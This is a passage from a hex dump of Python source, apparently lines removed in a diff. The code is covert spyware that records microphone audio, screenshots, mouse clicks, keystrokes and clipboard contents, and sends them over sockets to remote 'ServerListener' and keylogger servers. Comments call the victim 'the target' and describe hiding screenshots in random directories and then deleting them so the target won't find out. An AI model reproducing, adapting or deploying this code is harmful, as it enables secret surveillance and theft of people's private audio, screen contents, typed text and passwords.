-00000830: 723d 6368 756e 6b29 0d0a 2020 2020 2020  r=chunk)..      
-00000840: 2020 2020 2020 2320 7072 696e 7428 2272        # print("r
-00000850: 6563 6f72 6469 6e67 2e2e 2e22 290d 0a20  ecording...").. 
-00000860: 2020 2020 2020 2020 2020 2066 7261 6d65             frame
-00000870: 7320 3d20 5b5d 0d0a 0d0a 2020 2020 2020  s = []....      
-00000880: 2020 2020 2020 666f 7220 6920 696e 2072        for i in r
-00000890: 616e 6765 2830 2c20 696e 7428 7261 7465  ange(0, int(rate
-000008a0: 202f 2063 6875 6e6b 202a 2073 6563 6f6e   / chunk * secon
-000008b0: 6473 2929 3a0d 0a20 2020 2020 2020 2020  ds)):..         
-000008c0: 2020 2020 2020 2064 6174 6120 3d20 7374         data = st
-000008d0: 7265 616d 2e72 6561 6428 6368 756e 6b29  ream.read(chunk)
-000008e0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-000008f0: 2020 6672 616d 6573 2e61 7070 656e 6428    frames.append(
-00000900: 6461 7461 290d 0a0d 0a20 2020 2020 2020  data)....       
-00000910: 2020 2020 2023 2070 7269 6e74 2822 6669       # print("fi
-00000920: 6e69 7368 6564 2072 6563 6f72 6469 6e67  nished recording
-00000930: 2229 0d0a 0d0a 2020 2020 2020 2020 2020  ")....          
-00000940: 2020 2320 7374 6f70 2052 6563 6f72 6469    # stop Recordi
-00000950: 6e67 0d0a 2020 2020 2020 2020 2020 2020  ng..            
-00000960: 7374 7265 616d 2e73 746f 705f 7374 7265  stream.stop_stre
-00000970: 616d 2829 0d0a 2020 2020 2020 2020 2020  am()..          
-00000980: 2020 7374 7265 616d 2e63 6c6f 7365 2829    stream.close()
-00000990: 0d0a 2020 2020 2020 2020 2020 2020 6175  ..            au
-000009a0: 6469 6f2e 7465 726d 696e 6174 6528 290d  dio.terminate().
-000009b0: 0a0d 0a20 2020 2020 2020 2020 2020 2023  ...            #
-000009c0: 2043 6f6e 6e65 6374 696f 6e20 7769 7468   Connection with
-000009d0: 2053 6572 7665 724c 6973 7465 6e65 720d   ServerListener.
-000009e0: 0a0d 0a20 2020 2020 2020 2020 2020 2073  ...            s
-000009f0: 7472 5f66 7261 6d65 7320 3d20 7374 7228  tr_frames = str(
-00000a00: 6672 616d 6573 290d 0a20 2020 2020 2020  frames)..       
-00000a10: 2020 2020 206c 6973 7465 6e69 6e67 5f64       listening_d
-00000a20: 6174 612e 7365 6e64 2873 7472 5f66 7261  ata.send(str_fra
-00000a30: 6d65 732e 656e 636f 6465 2829 290d 0a0d  mes.encode())...
-00000a40: 0a20 2020 2020 2020 2065 7863 6570 7420  .        except 
-00000a50: 4f53 4572 726f 723a 0d0a 2020 2020 2020  OSError:..      
-00000a60: 2020 2020 2020 7072 696e 7428 224e 4f20        print("NO 
-00000a70: 4d49 4352 4f50 484f 4e45 2044 4554 4543  MICROPHONE DETEC
-00000a80: 5445 4420 4f52 204d 4943 524f 5048 4f4e  TED OR MICROPHON
-00000a90: 4520 5345 5454 494e 4720 4449 5341 424c  E SETTING DISABL
-00000aa0: 4544 2229 0d0a 2020 2020 2020 2020 2020  ED")..          
-00000ab0: 2020 6e6f 5f6d 6963 726f 666f 6e20 3d20    no_microfon = 
-00000ac0: 2254 4845 2054 4152 4745 5420 4841 5320  "THE TARGET HAS 
-00000ad0: 4e4f 204d 4943 524f 5048 4f4e 4520 4f4e  NO MICROPHONE ON
-00000ae0: 220d 0a20 2020 2020 2020 2020 2020 206c  "..            l
-00000af0: 6973 7465 6e69 6e67 5f64 6174 612e 7365  istening_data.se
-00000b00: 6e64 286e 6f5f 6d69 6372 6f66 6f6e 2e65  nd(no_microfon.e
-00000b10: 6e63 6f64 6528 2929 0d0a 2020 2020 2020  ncode())..      
-00000b20: 2020 2020 2020 2320 5365 6e64 7320 6461        # Sends da
-00000b30: 7461 2074 6f20 5365 7276 6572 4c69 7374  ta to ServerList
-00000b40: 656e 6572 0d0a 0d0a 2020 2020 6465 6620  ener....    def 
-00000b50: 616c 6c5f 6469 7228 7365 6c66 293a 0d0a  all_dir(self):..
-00000b60: 2020 2020 2020 2020 676c 6f62 616c 2072          global r
-00000b70: 616e 646f 6d5f 6c73 740d 0a20 2020 2020  andom_lst..     
-00000b80: 2020 207a 6569 6368 656e 203d 2022 7177     zeichen = "qw
-00000b90: 6572 747a 7569 6f70 6173 6466 6768 6a6b  ertzuiopasdfghjk
-00000ba0: 6c79 7863 7662 6e6d 3132 3334 3536 3738  lyxcvbnm12345678
-00000bb0: 3930 220d 0a20 2020 2020 2020 2072 616e  90"..        ran
-00000bc0: 646f 6d5f 6c73 7420 3d20 5b22 222e 6a6f  dom_lst = ["".jo
-00000bd0: 696e 2872 616e 646f 6d2e 7361 6d70 6c65  in(random.sample
-00000be0: 287a 6569 6368 656e 2c20 7261 6e64 6f6d  (zeichen, random
-00000bf0: 2e72 616e 6469 6e74 2834 2c20 3130 2929  .randint(4, 10))
-00000c00: 2920 666f 7220 7820 696e 2072 616e 6765  ) for x in range
-00000c10: 2831 3030 295d 0d0a 2020 2020 2020 2020  (100)]..        
-00000c20: 2320 5468 6973 206d 616b 6573 2061 206c  # This makes a l
-00000c30: 6973 7420 6f66 2065 7665 7279 2064 6972  ist of every dir
-00000c40: 6563 746f 7279 206e 616d 6520 7261 6e64  ectory name rand
-00000c50: 6f6d 6c79 0d0a 2020 2020 2020 2020 666f  omly..        fo
-00000c60: 7220 6469 725f 6e61 6d65 2069 6e20 7261  r dir_name in ra
-00000c70: 6e64 6f6d 5f6c 7374 3a0d 0a20 2020 2020  ndom_lst:..     
-00000c80: 2020 2020 2020 206f 732e 7379 7374 656d         os.system
-00000c90: 2866 226d 6b64 6972 207b 6469 725f 6e61  (f"mkdir {dir_na
-00000ca0: 6d65 7d22 290d 0a20 2020 2020 2020 2020  me}")..         
-00000cb0: 2020 2023 2054 6865 2064 6972 6563 746f     # The directo
-00000cc0: 7279 2069 7320 6265 696e 6720 6d61 6465  ry is being made
-00000cd0: 2068 6572 650d 0a0d 0a20 2020 2020 2020   here....       
-00000ce0: 2072 616e 646f 6d5f 6469 7220 3d20 7261   random_dir = ra
-00000cf0: 6e64 6f6d 2e63 686f 6963 6528 7261 6e64  ndom.choice(rand
-00000d00: 6f6d 5f6c 7374 290d 0a20 2020 2020 2020  om_lst)..       
-00000d10: 206f 732e 6368 6469 7228 7261 6e64 6f6d   os.chdir(random
-00000d20: 5f64 6972 290d 0a20 2020 2020 2020 2023  _dir)..        #
-00000d30: 2057 6520 6172 6520 6e6f 7720 696e 2074   We are now in t
-00000d40: 6861 7420 6469 7265 6374 6f72 7920 7768  hat directory wh
-00000d50: 6572 6520 7468 6520 696d 6167 6520 6361  ere the image ca
-00000d60: 6e20 6265 2073 746f 7265 640d 0a0d 0a20  n be stored.... 
-00000d70: 2020 2064 6566 2063 6c69 656e 7428 7365     def client(se
-00000d80: 6c66 2c20 6970 5f70 686f 746f 732c 2070  lf, ip_photos, p
-00000d90: 6f72 745f 7068 6f74 6f73 293a 0d0a 2020  ort_photos):..  
-00000da0: 2020 2020 2020 676c 6f62 616c 2066 6861        global fha
-00000db0: 6e64 6c65 0d0a 2020 2020 2020 2020 2320  ndle..        # 
-00000dc0: 6668 616e 646c 6520 6973 2074 6865 2076  fhandle is the v
-00000dd0: 6172 6961 626c 6520 7768 6963 6820 6f70  ariable which op
-00000de0: 656e 7320 7468 6520 666f 746f 0d0a 2020  ens the foto..  
-00000df0: 2020 2020 2020 7320 3d20 736f 636b 6574        s = socket
-00000e00: 2e73 6f63 6b65 7428 736f 636b 6574 2e41  .socket(socket.A
-00000e10: 465f 494e 4554 2c20 736f 636b 6574 2e53  F_INET, socket.S
-00000e20: 4f43 4b5f 5354 5245 414d 290d 0a20 2020  OCK_STREAM)..   
-00000e30: 2020 2020 2073 2e63 6f6e 6e65 6374 2828       s.connect((
-00000e40: 6970 5f70 686f 746f 732c 2070 6f72 745f  ip_photos, port_
-00000e50: 7068 6f74 6f73 2929 0d0a 2020 2020 2020  photos))..      
-00000e60: 2020 2320 5468 6973 2063 6f6e 6e65 6374    # This connect
-00000e70: 7320 746f 2074 6865 2073 6572 7665 7220  s to the server 
-00000e80: 796f 7520 7370 6563 6966 6965 640d 0a20  you specified.. 
-00000e90: 2020 2020 2020 2069 6d61 6765 203d 2070         image = p
-00000ea0: 672e 7363 7265 656e 7368 6f74 2829 0d0a  g.screenshot()..
-00000eb0: 2020 2020 2020 2020 2320 2269 6d61 6765          # "image
-00000ec0: 2220 7363 7265 656e 7368 6f74 7320 7468  " screenshots th
-00000ed0: 6520 6375 7272 656e 7420 696d 6167 6520  e current image 
-00000ee0: 6166 7465 7220 6120 7370 6563 6966 6963  after a specific
-00000ef0: 2074 696d 650d 0a20 2020 2020 2020 2066   time..        f
-00000f00: 6f74 6f6e 616d 6520 3d20 2249 6d61 6765  otoname = "Image
-00000f10: 2e70 6e67 220d 0a20 2020 2020 2020 2023  .png"..        #
-00000f20: 204e 616d 6520 6f66 2074 6865 2069 6d61   Name of the ima
-00000f30: 6765 0d0a 2020 2020 2020 2020 696d 6167  ge..        imag
-00000f40: 652e 7361 7665 2866 6f74 6f6e 616d 6529  e.save(fotoname)
-00000f50: 0d0a 2020 2020 2020 2020 2320 5361 7665  ..        # Save
-00000f60: 7320 7468 6520 696d 6167 6520 696e 2074  s the image in t
-00000f70: 6865 2063 7572 7265 6e74 2064 6972 6563  he current direc
-00000f80: 746f 7279 0d0a 2020 2020 2020 2020 6668  tory..        fh
-00000f90: 616e 646c 6520 3d20 6f70 656e 2866 6f74  andle = open(fot
-00000fa0: 6f6e 616d 652c 2022 7262 2229 0d0a 2020  oname, "rb")..  
-00000fb0: 2020 2020 2020 2320 4f70 656e 7320 7468        # Opens th
-00000fc0: 6520 696d 6167 650d 0a0d 0a20 2020 2020  e image....     
-00000fd0: 2020 2066 756c 6c5f 6d73 6720 3d20 6222     full_msg = b"
-00000fe0: 220d 0a20 2020 2020 2020 2023 2045 7665  "..        # Eve
-00000ff0: 7279 2069 6d61 6765 2069 6e66 6f72 6d61  ry image informa
-00001000: 7469 6f6e 2077 696c 6c20 6265 2073 746f  tion will be sto
-00001010: 7265 6420 696e 2022 6675 6c6c 5f6d 7367  red in "full_msg
-00001020: 220d 0a20 2020 2020 2020 2066 6f72 206c  "..        for l
-00001030: 696e 6520 696e 2066 6861 6e64 6c65 3a0d  ine in fhandle:.
-00001040: 0a20 2020 2020 2020 2020 2020 2066 756c  .            ful
-00001050: 6c5f 6d73 6720 2b3d 206c 696e 650d 0a0d  l_msg += line...
-00001060: 0a20 2020 2020 2020 2073 2e73 656e 6428  .        s.send(
-00001070: 6675 6c6c 5f6d 7367 290d 0a0d 0a20 2020  full_msg)....   
-00001080: 2064 6566 2063 6f75 6e74 646f 776e 5f73   def countdown_s
-00001090: 656e 6428 7365 6c66 2c20 7a65 6974 2c20  end(self, zeit, 
-000010a0: 6970 5f70 686f 746f 732c 2070 6f72 745f  ip_photos, port_
-000010b0: 7068 6f74 6f73 2c20 6970 5f6b 6579 6c6f  photos, ip_keylo
-000010c0: 6767 6572 2c20 706f 7274 5f6b 6579 6c6f  gger, port_keylo
-000010d0: 6767 6572 293a 0d0a 2020 2020 2020 2020  gger):..        
-000010e0: 7365 636f 6e64 735f 6c69 7374 203d 205b  seconds_list = [
-000010f0: 7a61 686c 2066 6f72 207a 6168 6c20 696e  zahl for zahl in
-00001100: 2072 616e 6765 2830 2c20 7a65 6974 202b   range(0, zeit +
-00001110: 2031 2c20 3230 2920 6966 207a 6168 6c20   1, 20) if zahl 
-00001120: 213d 2030 5d0d 0a20 2020 2020 2020 2023  != 0]..        #
-00001130: 2054 6865 2073 6563 6f6e 6473 2074 6865   The seconds the
-00001140: 2069 6d61 6765 2077 696c 6c20 6265 2073   image will be s
-00001150: 656e 7420 696e 2032 3020 7374 6570 7320  ent in 20 steps 
-00001160: 746f 2074 6865 2073 6572 7665 7220 7769  to the server wi
-00001170: 6c6c 2062 6520 7361 7665 6420 696e 2022  ll be saved in "
-00001180: 7365 636f 6e64 735f 6c69 7374 220d 0a20  seconds_list".. 
-00001190: 2020 2020 2020 2070 7269 6e74 2873 6563         print(sec
-000011a0: 6f6e 6473 5f6c 6973 7429 0d0a 2020 2020  onds_list)..    
-000011b0: 2020 2020 6b65 795f 6461 7461 203d 2073      key_data = s
-000011c0: 6f63 6b65 742e 736f 636b 6574 2873 6f63  ocket.socket(soc
-000011d0: 6b65 742e 4146 5f49 4e45 542c 2073 6f63  ket.AF_INET, soc
-000011e0: 6b65 742e 534f 434b 5f53 5452 4541 4d29  ket.SOCK_STREAM)
-000011f0: 0d0a 0d0a 2020 2020 2020 2020 7472 793a  ....        try:
-00001200: 0d0a 2020 2020 2020 2020 2020 2020 666f  ..            fo
-00001210: 7220 7820 696e 2072 616e 6765 287a 6569  r x in range(zei
-00001220: 7420 2b20 3129 3a0d 0a20 2020 2020 2020  t + 1):..       
-00001230: 2020 2020 2020 2020 2069 6620 7820 3d3d           if x ==
-00001240: 2032 303a 0d0a 2020 2020 2020 2020 2020   20:..          
-00001250: 2020 2020 2020 2020 2020 7365 6c66 2e61            self.a
-00001260: 6c6c 5f64 6972 2829 0d0a 2020 2020 2020  ll_dir()..      
-00001270: 2020 2020 2020 2020 2020 2020 2020 2320                # 
-00001280: 5468 6973 2066 756e 6374 696f 6e20 6d61  This function ma
-00001290: 6b65 7320 3130 3020 6669 6c65 7320 746f  kes 100 files to
-000012a0: 2073 746f 7265 2074 6865 2069 6d61 6765   store the image
-000012b0: 2073 6f20 7468 6520 7461 7267 6574 2077   so the target w
-000012c0: 6f6e 2774 2066 696e 6420 6f75 740d 0a20  on't find out.. 
-000012d0: 2020 2020 2020 2020 2020 2020 2020 2070                 p
-000012e0: 7269 6e74 2878 290d 0a20 2020 2020 2020  rint(x)..       
-000012f0: 2020 2020 2020 2020 207a 6569 7420 2d3d           zeit -=
-00001300: 2031 0d0a 2020 2020 2020 2020 2020 2020   1..            
-00001310: 2020 2020 7469 6d65 2e73 6c65 6570 2831      time.sleep(1
-00001320: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
-00001330: 2020 2069 6620 7820 696e 2073 6563 6f6e     if x in secon
-00001340: 6473 5f6c 6973 743a 0d0a 2020 2020 2020  ds_list:..      
-00001350: 2020 2020 2020 2020 2020 2020 2020 7365                se
-00001360: 6c66 2e63 6c69 656e 7428 6970 5f70 686f  lf.client(ip_pho
-00001370: 746f 732c 2070 6f72 745f 7068 6f74 6f73  tos, port_photos
-00001380: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
-00001390: 2020 2020 2020 2023 2054 6865 2069 6d61         # The ima
-000013a0: 6765 7320 7769 6c6c 2062 6520 7365 6e74  ges will be sent
-000013b0: 0d0a 2020 2020 2020 2020 2020 2020 6b65  ..            ke
-000013c0: 795f 6461 7461 2e63 6f6e 6e65 6374 2828  y_data.connect((
-000013d0: 6970 5f6b 6579 6c6f 6767 6572 2c20 706f  ip_keylogger, po
-000013e0: 7274 5f6b 6579 6c6f 6767 6572 2929 0d0a  rt_keylogger))..
-000013f0: 2020 2020 2020 2020 2020 2020 2320 5468              # Th
-00001400: 6973 2069 7320 7468 6520 6970 2061 6e64  is is the ip and
-00001410: 2074 6865 2070 6f72 7420 6f66 2074 6865   the port of the
-00001420: 2073 6572 7665 7220 7468 6520 706f 7274   server the port
-00001430: 2073 686f 756c 646e 2774 2062 6520 7468   shouldn't be th
-00001440: 6520 7361 6d65 2074 6865 2073 6572 7665  e same the serve
-00001450: 725f 7068 6f74 6f73 2061 6e64 2074 6865  r_photos and the
-00001460: 2073 6572 7665 725f 6b65 796c 6f67 6765   server_keylogge
-00001470: 7220 7368 6f75 6c64 6e27 7420 6265 0d0a  r shouldn't be..
-00001480: 2020 2020 2020 2020 2020 2020 2320 696e              # in
-00001490: 2074 6865 2073 616d 6520 666f 6c64 6572   the same folder
-000014a0: 0d0a 2020 2020 2020 2020 2020 2020 7365  ..            se
-000014b0: 6c66 2e63 6f6f 7264 696e 6174 6573 203d  lf.coordinates =
-000014c0: 206c 6973 7428 7365 7428 7365 6c66 2e63   list(set(self.c
-000014d0: 6f6f 7264 696e 6174 6573 2929 0d0a 2020  oordinates))..  
-000014e0: 2020 2020 2020 2020 2020 2320 5468 6973            # This
-000014f0: 2063 6865 636b 7320 6966 2074 6865 2063   checks if the c
-00001500: 6f6f 7264 696e 6174 6573 206f 6363 7572  oordinates occur
-00001510: 2032 2074 696d 6573 0d0a 2020 2020 2020   2 times..      
-00001520: 2020 2020 2020 7072 696e 7428 7365 6c66        print(self
-00001530: 2e63 6f6f 7264 696e 6174 6573 290d 0a20  .coordinates).. 
-00001540: 2020 2020 2020 2020 2020 2077 6f72 7420             wort 
-00001550: 3d20 2222 0d0a 2020 2020 2020 2020 2020  = ""..          
-00001560: 2020 666f 7220 7a65 6963 6865 6e20 696e    for zeichen in
-00001570: 2073 656c 662e 7269 6368 7469 6765 5f6c   self.richtige_l
-00001580: 6973 7465 3a0d 0a20 2020 2020 2020 2020  iste:..         
-00001590: 2020 2020 2020 2077 6f72 7420 2b3d 207a         wort += z
-000015a0: 6569 6368 656e 0d0a 0d0a 2020 2020 2020  eichen....      
-000015b0: 2020 2020 2020 2320 5365 6e64 7320 7468        # Sends th
-000015c0: 6520 6461 7461 2074 6f20 7365 7276 6572  e data to server
-000015d0: 5f6b 6579 6c6f 6767 6572 0d0a 2020 2020  _keylogger..    
-000015e0: 2020 2020 2020 2020 616c 6c5f 6461 7461          all_data
-000015f0: 203d 2073 7472 2873 656c 662e 636f 6f72   = str(self.coor
-00001600: 6469 6e61 7465 7329 202b 2077 6f72 740d  dinates) + wort.
-00001610: 0a20 2020 2020 2020 2020 2020 2023 2043  .            # C
-00001620: 6f6f 7264 696e 6174 6573 2061 6e64 206b  oordinates and k
-00001630: 6579 6461 7461 2061 7265 2062 6569 6e67  eydata are being
-00001640: 2063 6f6e 6361 7465 6e61 7465 640d 0a20   concatenated.. 
-00001650: 2020 2020 2020 2020 2020 206b 6579 5f64             key_d
-00001660: 6174 612e 7365 6e64 2861 6c6c 5f64 6174  ata.send(all_dat
-00001670: 612e 656e 636f 6465 2829 290d 0a20 2020  a.encode())..   
-00001680: 2020 2020 2020 2020 2070 7269 6e74 2877           print(w
-00001690: 6f72 7429 0d0a 2020 2020 2020 2020 2020  ort)..          
-000016a0: 2020 7072 696e 7428 7365 6c66 2e72 6963    print(self.ric
-000016b0: 6874 6967 655f 6c69 7374 6529 0d0a 2020  htige_liste)..  
-000016c0: 2020 2020 2020 2020 2020 6668 616e 646c            fhandl
-000016d0: 652e 636c 6f73 6528 290d 0a20 2020 2020  e.close()..     
-000016e0: 2020 2020 2020 2023 2043 6c6f 7365 7320         # Closes 
-000016f0: 7468 6520 696d 6167 650d 0a20 2020 2020  the image..     
-00001700: 2020 2020 2020 206f 732e 7265 6d6f 7665         os.remove
-00001710: 2822 496d 6167 652e 706e 6722 290d 0a20  ("Image.png").. 
-00001720: 2020 2020 2020 2020 2020 2023 2044 656c             # Del
-00001730: 6574 6573 2074 6865 2069 6d61 6765 2069  etes the image i
-00001740: 6e20 7468 6520 6375 7272 656e 7420 6469  n the current di
-00001750: 7265 6374 6f72 790d 0a20 2020 2020 2020  rectory..       
-00001760: 2020 2020 206f 732e 6368 6469 7228 222e       os.chdir(".
-00001770: 2e22 290d 0a20 2020 2020 2020 2020 2020  .")..           
-00001780: 2023 2057 6520 6861 7665 2074 6f20 676f   # We have to go
-00001790: 2062 6163 6b20 736f 2074 6861 7420 7765   back so that we
-000017a0: 2063 616e 2064 656c 6574 6520 7468 6520   can delete the 
-000017b0: 6f74 6865 7220 6469 7265 6374 6f72 6965  other directorie
-000017c0: 730d 0a20 2020 2020 2020 2020 2020 2066  s..            f
-000017d0: 6f72 2065 6163 685f 6469 7220 696e 2072  or each_dir in r
-000017e0: 616e 646f 6d5f 6c73 743a 0d0a 2020 2020  andom_lst:..    
-000017f0: 2020 2020 2020 2020 2020 2020 6f73 2e73              os.s
-00001800: 7973 7465 6d28 6622 726d 6469 7220 7b65  ystem(f"rmdir {e
-00001810: 6163 685f 6469 727d 2229 0d0a 2020 2020  ach_dir}")..    
-00001820: 2020 2020 2020 2020 2020 2020 2320 5468              # Th
-00001830: 6973 2064 656c 6574 6573 2065 7665 7279  is deletes every
-00001840: 2064 6972 6563 746f 7279 0d0a 2020 2020   directory..    
-00001850: 2020 2020 2020 2020 7379 732e 6578 6974          sys.exit
-00001860: 2829 0d0a 2020 2020 2020 2020 2020 2020  ()..            
-00001870: 2320 5374 6f70 7320 7468 6520 6b65 796c  # Stops the keyl
-00001880: 6f67 6765 720d 0a20 2020 2020 2020 2065  ogger..        e
-00001890: 7863 6570 7420 4b65 7962 6f61 7264 496e  xcept KeyboardIn
-000018a0: 7465 7272 7570 743a 0d0a 2020 2020 2020  terrupt:..      
-000018b0: 2020 2020 2020 2320 4966 2074 6865 2074        # If the t
-000018c0: 6172 6765 7420 6861 7320 6465 7374 726f  arget has destro
-000018d0: 7965 6420 7468 6520 636f 6e6e 6563 7469  yed the connecti
-000018e0: 6f6e 0d0a 2020 2020 2020 2020 2020 2020  on..            
-000018f0: 776f 7274 203d 2022 2a2a 2a25 c2a7 c2a7  wort = "***%....
-00001900: 29c2 a7c2 a725 220d 0a20 2020 2020 2020  )....%"..       
-00001910: 2020 2020 2023 2054 6869 7320 6973 206c       # This is l
-00001920: 696b 6520 6120 7370 6563 6961 6c20 636f  ike a special co
-00001930: 6465 2e20 546f 2073 706c 6974 2069 7420  de. To split it 
-00001940: 6174 2074 6865 2065 6e64 0d0a 2020 2020  at the end..    
-00001950: 2020 2020 2020 2020 666f 7220 7a65 6963          for zeic
-00001960: 6865 6e20 696e 2073 656c 662e 7269 6368  hen in self.rich
-00001970: 7469 6765 5f6c 6973 7465 3a0d 0a20 2020  tige_liste:..   
-00001980: 2020 2020 2020 2020 2020 2020 2077 6f72               wor
-00001990: 7420 2b3d 207a 6569 6368 656e 0d0a 2020  t += zeichen..  
-000019a0: 2020 2020 2020 2020 2020 6461 7461 203d            data =
-000019b0: 2066 2254 4845 2043 4f4e 4e45 4354 494f   f"THE CONNECTIO
-000019c0: 4e20 4841 5320 4245 454e 2049 4e54 4552  N HAS BEEN INTER
-000019d0: 5255 5054 4544 7b77 6f72 747d 220d 0a20  RUPTED{wort}".. 
-000019e0: 2020 2020 2020 2020 2020 2023 2054 6869             # Thi
-000019f0: 7320 6c65 7427 7320 7468 6520 7365 7276  s let's the serv
-00001a00: 6572 206b 6e6f 7720 7468 6174 2074 6865  er know that the
-00001a10: 2073 6572 7665 7220 7368 6f75 6c64 2073   server should s
-00001a20: 6875 7420 646f 776e 0d0a 2020 2020 2020  hut down..      
-00001a30: 2020 2020 2020 6b65 795f 6461 7461 2e63        key_data.c
-00001a40: 6f6e 6e65 6374 2828 6970 5f6b 6579 6c6f  onnect((ip_keylo
-00001a50: 6767 6572 2c20 706f 7274 5f6b 6579 6c6f  gger, port_keylo
-00001a60: 6767 6572 2929 0d0a 2020 2020 2020 2020  gger))..        
-00001a70: 2020 2020 6b65 795f 6461 7461 2e73 656e      key_data.sen
-00001a80: 6428 6461 7461 2e65 6e63 6f64 6528 2929  d(data.encode())
-00001a90: 0d0a 2020 2020 2020 2020 2020 2020 6b65  ..            ke
-00001aa0: 795f 6461 7461 2e63 6c6f 7365 2829 0d0a  y_data.close()..
-00001ab0: 0d0a 2020 2020 2020 2020 2020 2020 6966  ..            if
-00001ac0: 206f 732e 7061 7468 2e65 7869 7374 7328   os.path.exists(
-00001ad0: 2249 6d61 6765 2e70 6e67 2229 3a0d 0a20  "Image.png"):.. 
-00001ae0: 2020 2020 2020 2020 2020 2020 2020 2023                 #
-00001af0: 2049 7420 7769 6c6c 2064 6573 7472 6f79   It will destroy
-00001b00: 2074 6865 2069 6d61 6765 2073 6f20 7461   the image so ta
-00001b10: 7267 6574 2077 6f75 6e64 206b 6e6f 7720  rget wound know 
-00001b20: 616e 7974 6869 6e67 0d0a 2020 2020 2020  anything..      
-00001b30: 2020 2020 2020 2020 2020 6668 616e 646c            fhandl
-00001b40: 652e 636c 6f73 6528 290d 0a20 2020 2020  e.close()..     
-00001b50: 2020 2020 2020 2020 2020 206f 732e 7265             os.re
-00001b60: 6d6f 7665 2822 496d 6167 652e 706e 6722  move("Image.png"
-00001b70: 290d 0a20 2020 2020 2020 2020 2020 2023  )..            #
-00001b80: 2054 6869 7320 7265 6d6f 7665 7320 7468   This removes th
-00001b90: 6520 696d 6167 650d 0a0d 0a20 2020 2064  e image....    d
-00001ba0: 6566 206b 696c 6c5f 7377 6974 6368 2873  ef kill_switch(s
-00001bb0: 656c 6629 3a0d 0a20 2020 2020 2020 2023  elf):..        #
-00001bc0: 2054 6869 7320 6675 6e63 7469 6f6e 2064   This function d
-00001bd0: 6573 7472 6f79 7320 7468 6520 6d6f 7573  estroys the mous
-00001be0: 6520 696e 666f 0d0a 2020 2020 2020 2020  e info..        
-00001bf0: 6e65 775f 7365 636f 6e64 7320 3d20 7365  new_seconds = se
-00001c00: 6c66 2e64 7572 6174 696f 6e20 2b20 350d  lf.duration + 5.
-00001c10: 0a20 2020 2020 2020 2023 2032 3020 7365  .        # 20 se
-00001c20: 636f 6e64 7320 6172 6520 6265 696e 6720  conds are being 
-00001c30: 6164 6465 6420 6265 6361 7573 6520 7468  added because th
-00001c40: 6572 6520 6d69 6768 7420 6265 2061 2070  ere might be a p
-00001c50: 726f 626c 656d 0d0a 2020 2020 2020 2020  roblem..        
-00001c60: 666f 7220 7820 696e 2072 616e 6765 286e  for x in range(n
-00001c70: 6577 5f73 6563 6f6e 6473 293a 0d0a 2020  ew_seconds):..  
-00001c80: 2020 2020 2020 2020 2020 7469 6d65 2e73            time.s
-00001c90: 6c65 6570 2831 290d 0a20 2020 2020 2020  leep(1)..       
-00001ca0: 2023 2054 6869 7320 7374 6f70 6573 2074   # This stopes t
-00001cb0: 6865 0d0a 2020 2020 2020 2020 7379 732e  he..        sys.
-00001cc0: 6578 6974 2829 0d0a 0d0a 2020 2020 6465  exit()....    de
-00001cd0: 6620 6f6e 5f63 6c69 636b 2873 656c 662c  f on_click(self,
-00001ce0: 2078 2c20 792c 2062 7574 746f 6e2c 2070   x, y, button, p
-00001cf0: 7265 7373 6564 293a 0d0a 2020 2020 2020  ressed):..      
-00001d00: 2020 2320 5468 6973 2069 7320 7468 6520    # This is the 
-00001d10: 636c 6963 6b20 6675 6e63 7469 6f6e 0d0a  click function..
-00001d20: 2020 2020 2020 2020 7072 696e 7428 6622          print(f"
-00001d30: 5461 7267 6574 2068 6173 2070 7265 7373  Target has press
-00001d40: 6564 207b 787d 2061 6e64 207b 797d 2229  ed {x} and {y}")
-00001d50: 0d0a 2020 2020 2020 2020 2320 416c 6c20  ..        # All 
-00001d60: 7468 6520 636f 6f72 6469 6e61 7465 7320  the coordinates 
-00001d70: 7769 6c6c 2062 6520 7374 6f72 6564 2069  will be stored i
-00001d80: 6e20 2273 656c 662e 636f 6f72 6469 6e61  n "self.coordina
-00001d90: 7465 7322 0d0a 2020 2020 2020 2020 7365  tes"..        se
-00001da0: 6c66 2e63 6f6f 7264 696e 6174 6573 2e61  lf.coordinates.a
-00001db0: 7070 656e 6428 2878 2c20 7929 290d 0a0d  ppend((x, y))...
-00001dc0: 0a20 2020 2064 6566 2061 6c6c 5f63 6c69  .    def all_cli
-00001dd0: 636b 7328 7365 6c66 293a 0d0a 2020 2020  cks(self):..    
-00001de0: 2020 2020 2320 5468 6973 2069 7320 6a75      # This is ju
-00001df0: 7374 2061 2066 756e 6374 696f 6e20 736f  st a function so
-00001e00: 2069 7420 6361 6e20 6265 2072 616e 2077   it can be ran w
-00001e10: 6974 6820 7468 7265 6164 696e 670d 0a20  ith threading.. 
-00001e20: 2020 2020 2020 2077 6974 6820 4c69 7374         with List
-00001e30: 656e 6572 286f 6e5f 636c 6963 6b3d 7365  ener(on_click=se
-00001e40: 6c66 2e6f 6e5f 636c 6963 6b29 2061 7320  lf.on_click) as 
-00001e50: 6c69 7374 656e 696e 673a 0d0a 2020 2020  listening:..    
-00001e60: 2020 2020 2020 2020 7365 6c66 2e6b 696c          self.kil
-00001e70: 6c5f 7377 6974 6368 2829 0d0a 2020 2020  l_switch()..    
-00001e80: 2020 2020 2020 2020 6c69 7374 656e 696e          listenin
-00001e90: 672e 6a6f 696e 2829 0d0a 2020 2020 0d0a  g.join()..    ..
-00001ea0: 2020 2020 6465 6620 636f 7079 5f64 6174      def copy_dat
-00001eb0: 6128 7365 6c66 293a 0d0a 2020 2020 2020  a(self):..      
-00001ec0: 2020 7365 6c66 2e72 6963 6874 6967 655f    self.richtige_
-00001ed0: 6c69 7374 652e 6170 7065 6e64 2822 2028  liste.append(" (
-00001ee0: 434f 5059 2028 5374 7267 2b63 2929 2022  COPY (Strg+c)) "
-00001ef0: 290d 0a0d 0a20 2020 2064 6566 2061 7070  )....    def app
-00001f00: 656e 645f 7061 7374 6528 7365 6c66 293a  end_paste(self):
-00001f10: 0d0a 2020 2020 2020 2020 6461 7461 203d  ..        data =
-00001f20: 2066 2220 287b 7079 7065 7263 6c69 702e   f" ({pyperclip.
-00001f30: 7061 7374 6528 297d 207c 2050 4153 5445  paste()} | PASTE
-00001f40: 2028 5374 7267 2b76 2929 207c 2022 0d0a   (Strg+v)) | "..
-00001f50: 2020 2020 2020 2020 7365 6c66 2e72 6963          self.ric
-00001f60: 6874 6967 655f 6c69 7374 652e 6170 7065  htige_liste.appe
-00001f70: 6e64 2864 6174 6129 0d0a 0d0a 2020 2020  nd(data)....    
